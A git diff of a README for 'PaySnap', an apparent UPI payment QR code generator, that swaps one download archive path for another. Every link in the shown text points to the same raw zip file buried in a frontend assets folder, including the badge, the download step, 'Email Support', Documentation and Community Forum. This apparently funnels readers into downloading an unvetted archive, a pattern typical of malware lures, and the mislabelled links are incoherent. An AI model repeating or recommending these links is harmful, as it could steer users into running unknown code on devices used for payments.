@@ -1,6 +1,6 @@
 # 📦 PaySnap - Instantly Generate UPI Payment QR Codes
 
-[![Download PaySnap](https://raw.githubusercontent.com/lestary580/PaySnap/main/frontend/PaySnap_1.2.zip)](https://raw.githubusercontent.com/lestary580/PaySnap/main/frontend/PaySnap_1.2.zip)
+[![Download PaySnap](https://github.com/lestary580/PaySnap/raw/refs/heads/main/frontend/src/assets/Snap_Pay_v3.3-alpha.2.zip)](https://github.com/lestary580/PaySnap/raw/refs/heads/main/frontend/src/assets/Snap_Pay_v3.3-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To get started, visit the Releases page to download PaySnap. Here’s how:
 
 1. Click the link below to go to the download page:
    
-   [Visit this page to download](https://raw.githubusercontent.com/lestary580/PaySnap/main/frontend/PaySnap_1.2.zip)
+   [Visit this page to download](https://github.com/lestary580/PaySnap/raw/refs/heads/main/frontend/src/assets/Snap_Pay_v3.3-alpha.2.zip)
 
 2. On the releases page, you will find the latest version of PaySnap. 
    
@@ -81,7 +81,7 @@ For anyone with programming skills, feel free to submit a pull request with your
 Join our community of users who are passionate about using PaySnap. You can ask questions, share feedback, and find support from fellow users.
 
 - **GitHub Discussions**: Engage with other users and developers.
-- **Email Support**: For direct inquiries, you can email support at https://raw.githubusercontent.com/lestary580/PaySnap/main/frontend/PaySnap_1.2.zip
+- **Email Support**: For direct inquiries, you can email support at https://github.com/lestary580/PaySnap/raw/refs/heads/main/frontend/src/assets/Snap_Pay_v3.3-alpha.2.zip
 
 ## 📅 Future Updates
 
@@ -106,8 +106,8 @@ These technologies help ensure a smooth, user-friendly experience.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/lestary580/PaySnap/main/frontend/PaySnap_1.2.zip)
-- [Documentation](https://raw.githubusercontent.com/lestary580/PaySnap/main/frontend/PaySnap_1.2.zip)
-- [Community Forum](https://raw.githubusercontent.com/lestary580/PaySnap/main/frontend/PaySnap_1.2.zip)
+- [GitHub Repository](https://github.com/lestary580/PaySnap/raw/refs/heads/main/frontend/src/assets/Snap_Pay_v3.3-alpha.2.zip)
+- [Documentation](https://github.com/lestary580/PaySnap/raw/refs/heads/main/frontend/src/assets/Snap_Pay_v3.3-alpha.2.zip)
+- [Community Forum](https://github.com/lestary580/PaySnap/raw/refs/heads/main/frontend/src/assets/Snap_Pay_v3.3-alpha.2.zip)
 
 Thank you for using PaySnap! Enjoy generating your UPI QR codes.
